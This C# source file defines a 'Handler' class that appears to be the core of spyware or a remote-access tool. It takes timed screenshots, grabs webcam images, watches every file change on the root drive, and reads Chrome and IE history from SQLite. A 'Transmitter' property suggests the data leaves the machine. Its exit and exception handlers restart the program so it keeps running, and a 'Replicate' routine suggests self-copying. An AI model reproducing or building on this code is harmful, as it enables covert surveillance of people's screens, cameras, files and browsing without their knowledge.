using Library;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Library
{
    public delegate void OnScreenshotDelegate(object sender, System.Drawing.Bitmap bitmapImage);
    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);

    public class Handler
    {
        private bool isQuitting = false;
        public Transmitter Transmitter { get; set; }
        public System.Drawing.Bitmap Screenshot { get; private set; }
        public FileDirHandler FileDirInfo { get; private set; }
        private FileSystemWatcher watcher;
        private Timer screenShotTimer;
        private Image webcamImage;
        private WebCam webcam;

        public event OnScreenshotDelegate OnScreenshot;
        public event OnFileEventDelegate OnFileEvent;

        #region Singleton
        private static Handler instance;

        public static Handler Instance
        {
            get
            {
                lock (typeof(Handler))
                {
                    if (instance == null)
                    {
                        instance = new Handler();
                    }
                    return instance;
                }
            }
        }

        private Handler()
        {
            FileDirInfo = new FileDirHandler();
            watcher = new FileSystemWatcher();
            screenShotTimer = new Timer();
            screenShotTimer.Tick += screenShotTimer_Tick;
        }
        #endregion

        public void StartExceptionHandling()
        {
            Application.ThreadExit += Application_ThreadExit;
            Application.ThreadException += Application_ThreadException;
            Application.ApplicationExit += Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
        }

        public void StopExceptionHandling()
        {
            Application.ThreadExit -= Application_ThreadExit;
            Application.ThreadException -= Application_ThreadException;
            Application.ApplicationExit -= Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException -= CurrentDomain_UnhandledException;
        }

        public Process Restart(string filename)
        {
            Process process = new Process();
            process.StartInfo.FileName = filename;
            process.EnableRaisingEvents = true;
            process.Start();
            //process.Disposed += LaunchIfCrashed;
            process.Exited += Application_ApplicationExit;
            return process;
        }

        public void StartScreenshotTimer(int intervalMilliseconds)
        {
            screenShotTimer.Interval = intervalMilliseconds;
            screenShotTimer.Start();
        }

        public void StopScreenshotTimer()
        {
            screenShotTimer.Stop();
        }

        /// <summary>
        /// Watches root dir (usually C:\)
        /// </summary>
        public void StartDirectoryWatcher()
        {
            StartDirectoryWatcher(Directory.GetDirectoryRoot(Environment.CurrentDirectory), "*.*", true);
            //StartDirectoryWatcher(@"C:\", "*.*", true);
        }

        public void StartDirectoryWatcher(string directory, string filter, bool includeSubdirectories)
        {
            //directory = Environment.CurrentDirectory;
            watcher = new FileSystemWatcher(directory, filter);
            watcher.Path = directory;
            watcher.Filter = filter;
            watcher.NotifyFilter =
                NotifyFilters.Attributes |
                NotifyFilters.CreationTime |
                NotifyFilters.DirectoryName |
                NotifyFilters.FileName |
                NotifyFilters.LastAccess |
                NotifyFilters.LastWrite |
                NotifyFilters.Security |
                NotifyFilters.Size;
            watcher.IncludeSubdirectories = includeSubdirectories;

            watcher.Changed += watcher_Changed;
            watcher.Created += watcher_Created;
            watcher.Deleted += watcher_Deleted;
            watcher.Renamed += watcher_Renamed;

            watcher.EnableRaisingEvents = true;

            //Console.WriteLine("Watching dir: " + directory);
            //MessageBox.Show("Watching dir: " + directory);
        }

        public void StopDirectoryWatcher()
        {
            watcher.EnableRaisingEvents = false;
        }

        private void Replicate()
        {
            DialogResult dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
            if (dr == System.Windows.Forms.DialogResult.Yes)
            {
                Replicator.Instance.Replicate(true);
            }
        }

        public Image CaptureWebcamImage(ref PictureBox picBox)
        {
            webcam = new WebCam();
            webcam.InitializeWebCam(ref picBox);
            webcam.Start();
            webcamImage = picBox.Image;
            webcam.Stop();
            return webcamImage;
        }

        void HandleExit(String msg)
        {
            if (!isQuitting)
            {
                Application.Restart();
            }
            isQuitting = true;
        }

        private void HandleWatcher(FileSystemEventArgs e)
        {
            //MessageBox.Show("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            //Console.WriteLine("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            FileDirInfo.CreateFileDirInfoEntry(e);
            OnFileEvent(this, e);
        }

        void screenShotTimer_Tick(object sender, EventArgs e)
        {
            if (Screenshot != null)
                Screenshot.Dispose();

            Screenshot = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            {
                OnScreenshot(this, Screenshot);
            }

        }

        #region Watcher Events
        void watcher_Created(object sender, FileSystemEventArgs e)
        {
            //fdh.CreateFileDirInfoEntry(e);
            HandleWatcher(e);
        }

        void watcher_Changed(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Renamed(object sender, RenamedEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Deleted(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }
        #endregion


        #region Exception Events
        void Application_ThreadExit(object sender, EventArgs e)
        {
            HandleExit("Application: Thread Exit! Restarting...");
        }

        void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            HandleExit("Application: Thread Exception! Restarting...");
        }

        void Application_ApplicationExit(object sender, EventArgs e)
        {
            HandleExit("Application: Application Exit! Restarting...");
        }

        void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            HandleExit("Domain: Unhandled Exception! Restarting...");
        }

        void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            HandleExit("Domain: Process Exit! Restarting...");
        }
        #endregion



        public List<string> GetBrowserHistory(EBrowser browser, string historyFile)
        {
            SQLiteConnection conn = new SQLiteConnection(@"Data Source=" + historyFile);
            conn.Open();
            SQLiteCommand cmd = new SQLiteCommand();
            cmd.Connection = conn;
            //  cmd.CommandText = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;";
            //  Use the above query to get all the table names
            cmd.CommandText = "Select * From urls";
            SQLiteDataReader dr = cmd.ExecuteReader();
            while (dr.Read())
            {
                //MessageBox.Show(dr[1].ToString());
                Console.WriteLine(dr[1].ToString());
            }
            return null;
        }

        public enum EBrowser { Chrome, IE }
    }
}
